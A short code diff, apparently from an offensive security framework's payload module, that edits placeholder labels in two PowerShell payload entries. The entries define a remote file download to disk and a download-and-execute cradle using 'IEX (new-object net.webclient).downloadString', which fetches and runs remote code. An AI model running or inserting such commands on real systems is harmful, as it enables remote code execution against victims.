@@ -155,7 +155,7 @@ Load({
 
 Load({
 	title: "Download File",
-	payload: 'Invoke-WebRequest <PROMPT> -OutFile <PATH>',
+	payload: 'Invoke-WebRequest <PROMPT (URI)> -OutFile <PATH>',
 	category: "Powershell",
 	callback: function(bro){
 	    question("What is the full URI path of the hosted file? (ex: http://foo.bar/bro.exe)")
@@ -166,7 +166,7 @@ Load({
 
 Load({
 	title: "Download and Execute Remote PSH Script",
-	payload: 'IEX (new-object net.webclient).downloadString("<PROMPT (Full URI)>");',
+	payload: 'IEX (new-object net.webclient).downloadString("<PROMPT (URI)>");',
 	category: "Powershell",
 	callback: function(bro){
 	    question("What is the full URI path of the hosted PSH script? ")
